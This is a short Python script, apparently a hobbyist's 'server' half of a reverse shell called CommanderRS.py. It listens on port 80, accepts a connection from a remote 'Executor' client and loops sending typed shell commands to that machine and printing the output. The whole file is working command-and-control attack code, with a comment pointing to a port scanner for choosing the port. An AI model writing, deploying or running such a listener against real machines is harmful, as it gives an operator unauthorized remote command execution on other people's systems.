# Kode Blue, 10/30/2020
# "Server" side package of a Reverse Shell. Listens for remote machines.
# When Executor "client" side package is run, it connects to Server Machine
# Server Machine then sends commands to Client machine to execute.
# CommanderRS.py

import socket

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 80              # Set this guy to some port that the Executing machine will use to talk to the Commander Machine (you can find out using NetworkTools/PortScanner!)

BUFFER_SIZE = 1024
s = socket.socket()

s.bind((SERVER_HOST,SERVER_PORT))

s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

# Accept attempted client connections
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected")

message="I will drive now.".encode()
client_socket.send(message)

while True:
    # Send command (user input) to executor machine
    command = input(f"{client_address[0]}$ ")

    client_socket.send(command.encode())
    if command.lower() == "exit":
        # you can end the connection with command exit
        break
    
    # recieve and print the output of the Executor
    results = client_socket.recv(BUFFER_SIZE).decode()
    print(results)

# close connection
client_socket.close()

# close s socket (end the program)
s.close()
